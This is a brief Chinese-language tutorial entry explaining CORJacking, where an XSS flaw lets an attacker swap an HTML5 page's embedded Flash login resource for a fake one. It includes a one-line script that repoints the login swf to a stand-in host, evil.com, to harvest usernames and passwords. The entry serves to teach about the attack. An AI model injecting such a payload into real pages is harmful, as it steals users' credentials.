## CORJacking跨域资源劫持

HTML5应用有各种不同的资源，例如Flash文件，Silverligh，视频，音频等，这些资源可以通过DOM访问和控制。<br>
如果页面存在XSS漏洞，那么攻击者可能通过跨域资源的劫持进行攻击 。<br>

#### 举例：<br>
下面的代码载入了一个swf文件，作为用户登录框，这里面我们可以实现一些加密的逻辑。
  
`<object classid=“clsid:xxxxxxx-xxxx-xxxx-xxxxxx” id=“Login” width=“100%”height=“100%”  `<br>
  `  codebase=http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab>    ` <br>
`<param name=“movie”value=“Login.swf” />    `  <br>
`<param name=“quality”value=“high” />     `   <br>
`<embed src=“Login.swf”quality=“high” width=“50%” height=“50%”>`      <br>
`</object> `  <br>
##### 当页面存在XSS漏洞时，攻击者可以利用如下脚本把swf文件替换为欺诈的虚假资源。
`document.getElementByName(‘Login’).item(0).src=‘http://evil.com/login.swf’; ` <br>
那么当用户在这样的登录框里输入自己的用户名和密码并登录时，他的帐号就已经被盗取了。
